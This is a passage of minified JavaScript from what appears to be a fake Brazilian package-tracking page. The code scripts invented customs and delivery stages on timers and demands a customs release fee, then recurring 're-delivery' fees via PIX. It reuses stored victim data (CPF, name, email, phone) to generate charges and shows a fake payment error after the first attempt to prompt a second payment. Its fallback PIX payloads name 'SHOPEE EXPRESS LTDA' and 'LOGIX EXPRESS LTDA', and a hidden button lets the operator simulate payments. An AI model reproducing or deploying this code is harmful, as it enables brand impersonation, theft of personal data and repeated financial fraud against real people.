        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&t.remove()},5e3)}startDeliveryFlow(e){console.log(`🚚 Iniciando fluxo de entrega da ${e}ª tentativa`);const t=document.getElementById("trackingTimeline");if(!t)return;[{title:"Pedido sairá para entrega",description:"Seu pedido está sendo preparado para entrega",delay:2*60*1e3},{title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:2*60*60*1e3},{title:"Pedido em rota para seu destino",description:"Pedido em rota para seu destino, aguarde",delay:2*60*60*1e3},{title:"Nova tentativa de entrega",description:"Nova tentativa de entrega será realizada",delay:30*60*1e3,isNewAttempt:!0}].forEach((a,i)=>{setTimeout(()=>{const s=new Date,n=this.createTimelineItem({id:200+e*10+i,date:s,title:a.title,description:a.description,isChina:!1,completed:!0,needsLiberation:!1,isDeliveryAttempt:a.isNewAttempt,deliveryValue:a.isNewAttempt?this.deliveryValues[e%this.deliveryValues.length]:null,attemptNumber:a.isNewAttempt?e+1:null},!1);if(t.appendChild(n),setTimeout(()=>{n.style.opacity="1",n.style.transform="translateY(0)"},100),n.scrollIntoView({behavior:"smooth",block:"center"}),a.isNewAttempt){this.deliveryAttempts++;const l=this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length];this.updateCurrentStatus(`${this.deliveryAttempts+1}ª Tentativa de Entrega (Aguardando Pagamento)`),console.log(`🔄 Próxima tentativa configurada: ${this.deliveryAttempts+1}ª - R$ ${l.toFixed(2)}`)}},a.delay)})}closeDeliveryPaymentModal(){const e=document.getElementById("deliveryPaymentModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}async openDeliveryModal(e,t,o){var a,i,s,n,l;console.log(`🚚 Abrindo modal de ${e}ª tentativa de entrega - R$ ${t.toFixed(2)}`),p.showLoadingNotification();try{const r={nome:((a=this.leadData)==null?void 0:a.nome_completo)||((i=this.userData)==null?void 0:i.nome)||"Cliente",cpf:((s=this.leadData)==null?void 0:s.cpf)||this.currentCPF||"00000000000",email:((n=this.leadData)==null?void 0:n.email)||"cliente@email.com",telefone:((l=this.leadData)==null?void 0:l.telefone)||"11999999999"};console.log("📡 Gerando PIX para tentativa de entrega:",{userData:r,value:t});const c=await this.zentraPayService.createPixTransaction(r,t);if(p.closeLoadingNotification(),c.success)console.log("✅ PIX de entrega gerado com sucesso"),this.showDeliveryPaymentModal(e,t,c,o);else throw new Error(c.error||"Erro ao gerar PIX")}catch(r){console.error("❌ Erro ao gerar PIX de entrega:",r),p.closeLoadingNotification(),this.showDeliveryPaymentModal(e,t,null,o)}}showDeliveryPaymentModal(e,t,o,a){var r,c;const i=document.createElement("div");i.className="modal-overlay",i.id="deliveryPaymentModal",i.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let s,n;o&&o.pixPayload?(s=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o.pixPayload)}`,n=o.pixPayload):(s="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",n="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2");const l=((r=this.leadData)==null?void 0:r.nome_completo)||((c=this.userData)==null?void 0:c.nome)||"Cliente";i.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${e}ª Tentativa de Entrega</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            <strong>${l}</strong>, para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de <strong>R$ ${t.toFixed(2)}</strong>.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${e}ª Tentativa</span>
                            <span class="fee-amount">R$ ${t.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${s}" alt="QR Code PIX Entrega" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${n}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button id="simulateDeliveryPaymentButton" style="
                                background: transparent;
                                color: #666;
                                border: 1px solid #ddd;
                                padding: 6px 12px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-weight: 600;
                                transition: all 0.3s ease;
                                opacity: 0.7;
                                font-size: 12px;
                                min-width: 30px;
                                height: 28px;
                            ">
                                -
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(i),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(i,e,a)}setupDeliveryModalEvents(e,t,o){const a=e.querySelector("#closeDeliveryPaymentModal");a&&a.addEventListener("click",()=>{this.closeDeliveryModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()});const s=e.querySelector("#simulateDeliveryPaymentButton");s&&s.addEventListener("click",()=>{this.simulateDeliveryPayment(t,o)}),e.addEventListener("click",n=>{n.target===e&&this.closeDeliveryModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{this.showCopySuccess(t)}):(document.execCommand("copy"),this.showCopySuccess(t))}catch(o){console.error("❌ Erro ao copiar PIX:",o)}}simulateDeliveryPayment(e,t){console.log(`💳 Simulando pagamento da ${e}ª tentativa de entrega`),this.closeDeliveryModal(),t&&(t.style.display="none"),this.showDeliverySuccessNotification(e),setTimeout(()=>{this.startNextDeliveryCycle(e)},2e3)}showDeliverySuccessNotification(e){const t=document.createElement("div");t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${e}ª tentativa reagendada.</div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>t.remove(),5e3)}startNextDeliveryCycle(e){console.log(`🔄 Iniciando próximo ciclo após ${e}ª tentativa`);const t=e>=3?1:e+1,o=this.getNextDeliveryStageId(t);console.log(`📦 Próxima tentativa será: ${t}ª (Stage ID: ${o})`),[{id:o-3,title:"Pedido sairá para entrega",delay:0},{id:o-2,title:"Pedido em trânsito para entrega",delay:2*60*1e3},{id:o-1,title:"Pedido em rota de entrega",delay:4*60*1e3},{id:o,title:`${t}ª Tentativa de entrega`,delay:6*60*1e3,hasDeliveryButton:!0}].forEach(i=>{setTimeout(()=>{this.addDeliveryStage(i)},i.delay)})}getNextDeliveryStageId(e){return{1:16,2:106,3:116}[e]||16}closeDeliveryModal(){const e=document.getElementById("deliveryPaymentModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}async updateLeadStageInDatabase(e){if(this.currentCPF)try{await this.dbService.updateLeadStage(this.currentCPF,e),console.log(`✅ Etapa atualizada no banco: ${e}`)}catch(t){console.error("❌ Erro ao atualizar etapa:",t)}}highlightLiberationButton(){const e=document.querySelector(".liberation-button-timeline");e&&(p.scrollToElement(e,window.innerHeight/2),setTimeout(()=>{e.style.animation="pulse 2s infinite, glow 2s ease-in-out",e.style.boxShadow="0 0 20px rgba(255, 107, 53, 0.8)",setTimeout(()=>{e.style.animation="pulse 2s infinite",e.style.boxShadow="0 4px 15px rgba(255, 107, 53, 0.4)"},6e3)},500))}setupModalEvents(){const e=document.getElementById("closeModal");e&&e.addEventListener("click",()=>{this.closeModal("liberationModal")});const t=document.getElementById("closeDeliveryModal");t&&t.addEventListener("click",()=>{this.closeModal("deliveryModal")}),["liberationModal","deliveryModal"].forEach(o=>{const a=document.getElementById(o);a&&a.addEventListener("click",i=>{i.target.id===o&&this.closeModal(o)})})}setupCopyButtons(){[{buttonId:"copyPixButtonModal",inputId:"pixCodeModal"},{buttonId:"copyPixButtonDelivery",inputId:"pixCodeDelivery"}].forEach(({buttonId:t,inputId:o})=>{const a=document.getElementById(t);a&&a.addEventListener("click",()=>{this.copyPixCode(o,t)})})}setupAccordion(){const e=document.getElementById("detailsHeader");e&&e.addEventListener("click",()=>{this.toggleAccordion()})}setupKeyboardEvents(){document.addEventListener("keydown",e=>{e.key==="Escape"&&(this.closeModal("liberationModal"),this.closeModal("deliveryModal"),p.closeLoadingNotification())})}setupTimelineButtonEvents(e){try{const t=e.querySelector(".liberation-button-timeline");t&&t.addEventListener("click",()=>{console.log("🔓 Botão LIBERAR OBJETO clicado"),this.openLiberationModal()});const o=e.querySelector(".delivery-button-timeline");o&&o.addEventListener("click",()=>{const a=parseInt(o.dataset.attempt),i=parseFloat(o.dataset.value);console.log(`🚚 Botão LIBERAR ENTREGA clicado - Tentativa ${a} - R$ ${i.toFixed(2)}`),this.openDeliveryModal(a,i)})}catch(t){console.error("❌ Erro ao configurar eventos dos botões:",t)}}async openLiberationModal(){console.log("🚀 Iniciando processo de geração de PIX com dados reais do banco..."),p.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");const e=window.valor_em_reais||26.34;console.log("💰 Valor da transação:",`R$ ${e.toFixed(2)}`);const t={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone};console.log("👤 Dados REAIS do banco para pagamento:",{nome:t.nome,cpf:t.cpf,email:t.email,telefone:t.telefone}),console.log("📡 Enviando requisição para Zentra Pay com dados reais...");const o=await this.zentraPayService.createPixTransaction(t,e);if(o.success)console.log("🎉 PIX gerado com sucesso usando dados reais do banco!"),console.log("📋 Dados recebidos:",{transactionId:o.transactionId,externalId:o.externalId,pixPayload:o.pixPayload}),this.pixData=o,p.closeLoadingNotification(),setTimeout(()=>{this.displayRealPixModal(),setTimeout(()=>{this.addPaymentSimulationButton()},800)},300);else throw new Error(o.error||"Erro desconhecido ao gerar PIX")}catch(e){console.error("💥 Erro ao gerar PIX:",e),p.closeLoadingNotification(),p.showError(`Erro ao gerar PIX: ${e.message}`),setTimeout(()=>{console.log("⚠️ Exibindo modal estático como fallback"),this.displayStaticPixModal(),setTimeout(()=>{this.addPaymentSimulationButton()},800)},1e3)}}async openDeliveryModal(e,t){console.log(`🚚 Abrindo modal de entrega - Tentativa ${e} - R$ ${t.toFixed(2)}`),this.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");const o={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone};console.log("📡 Gerando PIX para tentativa de entrega via Zentra Pay...");const a=await this.zentraPayService.createPixTransaction(o,t);if(a.success)console.log("🎉 PIX de entrega gerado com sucesso!"),this.deliveryPixData=a,this.closeLoadingNotification(),setTimeout(()=>{this.displayDeliveryPixModal(e,t)},300);else throw new Error(a.error||"Erro ao gerar PIX de entrega")}catch(o){console.error("💥 Erro ao gerar PIX de entrega:",o),this.closeLoadingNotification(),setTimeout(()=>{this.displayDeliveryPixModal(e,t,!0)},300)}}displayDeliveryPixModal(e,t,o=!1){const a=document.getElementById("deliveryPixModal");a&&a.remove();const i=document.createElement("div");i.className="modal-overlay",i.id="deliveryPixModal",i.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let s,n;!o&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(s=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,n=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para entrega")):(s="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",n="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para entrega")),i.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${e}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${t.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${e}° Tentativa</span>
                            <span class="fee-amount">R$ ${t.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${s}" alt="QR Code PIX Entrega" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${n}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de Simulação -->
                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <button id="simulateDeliveryPaymentButton" style="
                                background: transparent;
                                color: #666;
                                border: 1px solid #ddd;
                                padding: 6px 12px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-weight: 600;
                                transition: all 0.3s ease;
                                opacity: 0.7;
                                font-size: 12px;
                                min-width: 30px;
                                height: 28px;
                            ">
                                -
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(i),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(i,e,t),console.log(`💳 Modal de PIX para ${e}° tentativa exibido - R$ ${t.toFixed(2)}`)}setupDeliveryModalEvents(e,t,o){const a=e.querySelector("#closeDeliveryPixModal");a&&a.addEventListener("click",()=>{this.closeDeliveryPixModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()});const s=e.querySelector("#simulateDeliveryPaymentButton");s&&(s.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),s.addEventListener("mouseenter",function(){this.style.background="rgba(0, 0, 0, 0.05)",this.style.transform="translateY(-1px)",this.style.opacity="1"}),s.addEventListener("mouseleave",function(){this.style.background="transparent",this.style.transform="translateY(0)",this.style.opacity="0.7"})),e.addEventListener("click",n=>{n.target===e&&this.closeDeliveryPixModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de entrega copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX de entrega:",o)}}simulateDeliveryPayment(e){console.log(`💳 Simulando pagamento da ${e}° tentativa de entrega`),this.closeDeliveryPixModal(),this.showDeliveryPaymentSuccess(e),setTimeout(()=>{this.updateDeliveryPaymentStatus(e)},1e3)}showDeliveryPaymentSuccess(e){const t=document.createElement("div");t.className="payment-success-notification",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${e}° tentativa de entrega paga.</div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&t.remove()},5e3)}async updateDeliveryPaymentStatus(e){if(this.currentCPF)try{const t=e>=3?30:17+e*4,o=JSON.parse(localStorage.getItem("leads")||"[]"),a=o.findIndex(i=>i.cpf&&i.cpf.replace(/[^\d]/g,"")===this.currentCPF);a!==-1&&(o[a].etapa_atual=t,o[a].updated_at=new Date().toISOString(),localStorage.setItem("leads",JSON.stringify(o)),console.log(`✅ Etapa atualizada para ${t} após pagamento da ${e}° tentativa`),setTimeout(()=>{this.generateRealTrackingData(),this.renderTimeline()},2e3))}catch(t){console.error("❌ Erro ao atualizar status de entrega:",t)}}closeDeliveryPixModal(){const e=document.getElementById("deliveryPixModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showPaymentError(){this.paymentErrorShown=!0;const e=document.createElement("div");e.id="paymentErrorOverlay",e.className="modal-overlay",e.style.display="flex",e.innerHTML=`
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `,document.body.appendChild(e),document.body.style.overflow="hidden";const t=document.getElementById("closePaymentErrorModal"),o=document.getElementById("retryPaymentButton");t&&t.addEventListener("click",()=>{this.closePaymentErrorModal()}),o&&o.addEventListener("click",()=>{this.closePaymentErrorModal(),this.openLiberationModal()}),e.addEventListener("click",a=>{a.target===e&&this.closePaymentErrorModal()})}closePaymentErrorModal(){const e=document.getElementById("paymentErrorOverlay");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}displayRealPixModal(){console.log("🎯 Exibindo modal com dados reais do PIX...");const e=document.getElementById("realPixQrCode");if(e&&this.pixData.pixPayload){const a=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;e.src=a,e.alt="QR Code PIX Real - Zentra Pay Oficial",console.log("✅ QR Code atualizado com dados reais da API oficial")}const t=document.getElementById("pixCodeModal");t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload,console.log("✅ Código PIX Copia e Cola atualizado com dados reais da API oficial"));const o=document.getElementById("liberationModal");o&&(o.style.display="flex",document.body.style.overflow="hidden",console.log("🎯 Modal PIX real exibido com sucesso"),setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!")}addPaymentSimulationButton(){const e=document.querySelector(".professional-modal-content");if(!e||document.getElementById("simulatePaymentButton"))return;const t=document.createElement("div");t.style.cssText=`
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `,t.innerHTML=`
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `,e.appendChild(t);const o=document.getElementById("simulatePaymentButton");o&&(o.addEventListener("click",()=>{this.simulatePayment()}),o.addEventListener("mouseenter",function(){this.style.background="rgba(0, 0, 0, 0.05)",this.style.transform="translateY(-1px)",this.style.opacity="1"}),o.addEventListener("mouseleave",function(){this.style.background="transparent",this.style.transform="translateY(0)",this.style.opacity="0.7"}))}simulatePayment(){this.closeModal("liberationModal"),this.paymentRetryCount++,this.paymentRetryCount===1?setTimeout(()=>{this.showPaymentError()},1e3):(this.paymentRetryCount=0,this.processSuccessfulPayment())}async processSuccessfulPayment(){this.trackingData&&(this.trackingData.liberationPaid=!0),this.leadData&&await this.updatePaymentStatusInDatabase("pago");const e=document.querySelector(".liberation-button-timeline");e&&(e.style.display="none"),this.showSuccessNotification(),setTimeout(()=>{this.startDeliveryFlow()},1e3)}startDeliveryFlow(){console.log("🚚 Iniciando fluxo de entrega após liberação alfandegária..."),this.deliverySystem||(this.deliverySystem=new P(this)),this.deliverySystem.startDeliveryFlow()}addPostPaymentSteps(){if(!document.getElementById("trackingTimeline"))return;console.log("🚀 Iniciando fluxo de entrega pós-pagamento..."),[{id:12,title:"Pedido liberado na alfândega de importação",delay:0},{id:13,title:"Pedido sairá para entrega",delay:2*60*1e3},{id:14,title:"Pedido em trânsito para entrega",delay:2*60*60*1e3},{id:15,title:"Pedido em rota de entrega",delay:4*60*60*1e3},{id:16,title:"1ª Tentativa de entrega",delay:6*60*60*1e3,hasDeliveryButton:!0}].forEach((o,a)=>{setTimeout(()=>{this.addDeliveryStage(o)},o.delay)})}addDeliveryStage(e){const t=document.getElementById("trackingTimeline");if(!t)return;const o=new Date,a=this.createTimelineItem({id:e.id,date:o,title:e.title,description:e.title,isChina:!1,completed:!0,hasDeliveryButton:e.hasDeliveryButton},e.id===16);t.appendChild(a),setTimeout(()=>{a.style.opacity="1",a.style.transform="translateY(0)"},100),a.scrollIntoView({behavior:"smooth",block:"center"}),console.log(`✅ Etapa adicionada: ${e.title}`),this.updateLeadStageInDatabase(e.id)}async updatePaymentStatusInDatabase(e){if(this.currentCPF)try{const t=JSON.parse(localStorage.getItem("leads")||"[]"),o=t.findIndex(a=>a.cpf&&a.cpf.replace(/[^\d]/g,"")===this.currentCPF);o!==-1&&(t[o].status_pagamento=e,t[o].etapa_atual=12,t[o].updated_at=new Date().toISOString(),localStorage.setItem("leads",JSON.stringify(t)),console.log("✅ Status de pagamento atualizado no localStorage:",e))}catch(t){console.error("❌ Erro ao atualizar status no localStorage:",t)}}showSuccessNotification(){const e=document.createElement("div");if(e.className="payment-success-notification",e.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,e.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `,document.body.appendChild(e),!document.getElementById("notificationAnimations")){const t=document.createElement("style");t.id="notificationAnimations",t.textContent=`
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(t)}setTimeout(()=>{e.parentNode&&e.remove()},5e3)}displayStaticPixModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="flex",document.body.style.overflow="hidden",setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("⚠️ Modal PIX estático exibido como fallback")}guideToCopyButton(){const e=document.getElementById("copyPixButtonModal"),t=document.querySelector(".pix-copy-section");if(!e||!t)return;t.style.position="relative";const o=document.createElement("div");o.className="copy-guide-indicator",o.innerHTML="👆 Copie o código PIX aqui",o.style.cssText=`
            position: absolute;
            top: -35px;
            right: 0;
            background: #ff6b35;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
            z-index: 10;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
        `,t.appendChild(o),t.style.animation="highlightSection 3s ease",setTimeout(()=>{t.scrollIntoView({behavior:"smooth",block:"center"})},200),setTimeout(()=>{o.parentNode&&o.remove(),t.style.animation=""},6e3)}closeModal(e){const t=document.getElementById(e);t&&(t.style.display="none",document.body.style.overflow="auto")}toggleAccordion(){const e=document.getElementById("detailsContent"),t=document.querySelector(".toggle-icon");!e||!t||(e.classList.contains("expanded")?(e.classList.remove("expanded"),t.classList.remove("rotated")):(e.classList.add("expanded"),t.classList.add("rotated")))}copyPixCode(e,t){const o=document.getElementById(e),a=document.getElementById(t);if(!(!o||!a))try{o.select(),o.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(o.value).then(()=>{console.log("✅ PIX copiado via Clipboard API:",o.value.substring(0,50)+"..."),this.showCopySuccess(a)}).catch(()=>{this.fallbackCopy(o,a)}):this.fallbackCopy(o,a)}catch(i){console.error("❌ Erro ao copiar PIX:",i),p.showError("Erro ao copiar código PIX. Tente selecionar e copiar manualmente.")}}fallbackCopy(e,t){try{if(document.execCommand("copy"))console.log("✅ PIX copiado via execCommand:",e.value.substring(0,50)+"..."),this.showCopySuccess(t);else throw new Error("execCommand falhou")}catch(o){console.error("❌ Fallback copy falhou:",o),p.showError("Erro ao copiar. Selecione o texto e use Ctrl+C.")}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}handleAutoFocus(){if(new URLSearchParams(window.location.search).get("focus")==="cpf"){setTimeout(()=>{const o=document.getElementById("cpfInput");if(o){const 